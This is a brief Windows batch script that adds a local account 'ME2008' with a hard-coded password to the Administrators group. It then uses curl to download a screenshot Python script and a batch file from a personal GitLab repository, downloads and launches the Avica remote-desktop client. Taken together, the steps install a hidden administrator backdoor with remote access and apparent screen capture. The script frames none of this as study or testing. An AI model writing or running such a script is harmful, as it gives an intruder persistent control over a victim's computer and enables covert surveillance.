@echo off
setlocal

net user ME2008 "MR.English2008" /add
net localgroup Administrators ME2008 /add

curl -o screenshot.py https://gitlab.com/MR.English2008/avica/-/raw/main/screenshot.py
curl -o show.bat https://gitlab.com/MR.English2008/avica/-/raw/main/show.bat
curl -o AvicaLite.exe https://download.avica.com/AvicaLite_v8.0.8.9.exe

start "" /WAIT AvicaLite.exe

endlocal